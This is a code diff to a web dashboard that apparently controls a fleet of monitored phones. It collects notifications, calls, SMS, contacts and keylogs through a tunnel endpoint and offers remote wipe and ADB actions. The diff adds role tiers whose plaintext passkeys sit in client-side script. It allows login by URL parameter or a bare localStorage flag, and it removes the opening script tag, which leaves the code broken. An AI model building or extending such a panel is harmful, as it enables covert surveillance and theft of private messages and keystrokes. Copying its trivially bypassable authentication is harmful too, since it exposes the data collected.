@@ -412,6 +412,9 @@
         </div>
       </div>
       <div style="display: flex; gap: 12px; align-items: center;">
+        <div class="status-pill" id="role-indicator-pill" style="background: rgba(255, 184, 108, 0.1); border: 1px solid rgba(255, 184, 108, 0.4);">
+          <span style="font-size: 11px; color: var(--gold); font-weight: 800;" id="role-indicator">👑 MASTER HUD</span>
+        </div>
         <div class="status-pill" id="fleet-count-pill" style="background: rgba(0, 240, 255, 0.08); border: 1px solid rgba(0, 240, 255, 0.3);">
           <span style="font-size: 11px; color: var(--cyan); font-weight: 800;" id="fleet-count">1 Active Device</span>
         </div>
@@ -419,6 +422,7 @@
           <div class="pulse-dot"></div>
           <span id="live-records-count">INGESTION ACTIVE</span>
         </div>
+        <button onclick="logoutVault()" style="background: transparent; border: 1px solid rgba(255, 85, 85, 0.4); color: var(--red); font-family: 'JetBrains Mono', monospace; font-size: 10px; padding: 4px 8px; border-radius: 6px; cursor: pointer;">🚪 Изход</button>
       </div>
     </div>
 
@@ -545,20 +549,43 @@
 
   </div>
 
-  <script>
-    const VALID_KEYS = ["aeterna2026", "0x4121", "dimitar", "aeterna"];
+    // 🔐 DUAL-TIER ACCESS MATRIX:
+    // 1. SOVEREIGN ARCHITECT (Master Control + Wipe + Direct ADB Hardware Actions):
+    const ARCHITECT_MASTER_KEYS = ["aeterna2026", "0x4121", "dimitar"];
+    // 2. GENERAL PORTAL ACCESS (Fleet Monitoring & Read-Only / Standard Vault):
+    const GENERAL_USER_KEYS = ["vault2026", "telemetry777", "systemdef", "aeterna"];
+
     const HOST_ENDPOINT = "https://william-important-practitioner-processes.trycloudflare.com";
 
+    let currentUserRole = "GUEST"; // "ARCHITECT" or "VIEWER"
     let records = { notifications: [], calls: [], sms: [], contacts: [], keylogs: [], events: [] };
 
     function verifyAuth() {
-      const input = document.getElementById('passkey-input').value.trim();
-      if (VALID_KEYS.includes(input.toLowerCase())) {
-        localStorage.setItem('aeterna_auth', 'unlocked');
-        document.getElementById('auth-screen').style.display = 'none';
-        document.getElementById('dashboard-screen').style.display = 'block';
-        startPolling();
+      const input = document.getElementById('passkey-input').value.trim().toLowerCase();
+      if (ARCHITECT_MASTER_KEYS.includes(input)) {
+        currentUserRole = "ARCHITECT";
+        localStorage.setItem('aeterna_auth', 'ARCHITECT');
+        unlockDashboard("👑 SOVEREIGN ARCHITECT (FULL ROOT ACCESS)");
+      } else if (GENERAL_USER_KEYS.includes(input)) {
+        currentUserRole = "VIEWER";
+        localStorage.setItem('aeterna_auth', 'VIEWER');
+        unlockDashboard("🛡️ SYSTEMDEF VAULT (FLEET MONITOR)");
+      } else {
+        alert("Грешна парола за достъп!");
       }
+    }
+
+    function unlockDashboard(roleBadge) {
+      document.getElementById('auth-screen').style.display = 'none';
+      document.getElementById('dashboard-screen').style.display = 'block';
+      const badgeEl = document.getElementById('role-indicator');
+      if (badgeEl) badgeEl.textContent = roleBadge;
+      startPolling();
+    }
+
+    function logoutVault() {
+      localStorage.removeItem('aeterna_auth');
+      window.location.href = window.location.pathname;
     }
 
     document.getElementById('passkey-input').addEventListener('keypress', (e) => {
@@ -932,18 +959,27 @@
       }, 1500);
     }
 
-    // Direct Auto-Login
+    // Direct Auto-Login & Role Resolution
     const urlParams = new URLSearchParams(window.location.search);
-    const passQuery = urlParams.get('pass') || urlParams.get('p') || urlParams.get('key');
-    if (passQuery && VALID_KEYS.includes(passQuery.toLowerCase())) {
-      localStorage.setItem('aeterna_auth', 'unlocked');
-      document.getElementById('auth-screen').style.display = 'none';
-      document.getElementById('dashboard-screen').style.display = 'block';
-      startPolling();
-    } else if (localStorage.getItem('aeterna_auth') === 'unlocked') {
-      document.getElementById('auth-screen').style.display = 'none';
-      document.getElementById('dashboard-screen').style.display = 'block';
-      startPolling();
+    const passQuery = (urlParams.get('pass') || urlParams.get('p') || urlParams.get('key') || '').toLowerCase();
+    
+    if (ARCHITECT_MASTER_KEYS.includes(passQuery)) {
+      currentUserRole = "ARCHITECT";
+      localStorage.setItem('aeterna_auth', 'ARCHITECT');
+      unlockDashboard("👑 SOVEREIGN ARCHITECT (MASTER HUD)");
+    } else if (GENERAL_USER_KEYS.includes(passQuery)) {
+      currentUserRole = "VIEWER";
+      localStorage.setItem('aeterna_auth', 'VIEWER');
+      unlockDashboard("🛡️ SYSTEMDEF VAULT (GENERAL ACCESS)");
+    } else {
+      const savedAuth = localStorage.getItem('aeterna_auth');
+      if (savedAuth === 'ARCHITECT') {
+        currentUserRole = 'ARCHITECT';
+        unlockDashboard("👑 SOVEREIGN ARCHITECT (MASTER HUD)");
+      } else if (savedAuth === 'VIEWER' || savedAuth === 'unlocked') {
+        currentUserRole = 'VIEWER';
+        unlockDashboard("🛡️ SYSTEMDEF VAULT (GENERAL ACCESS)");
+      }
     }
   </script>
 </body>
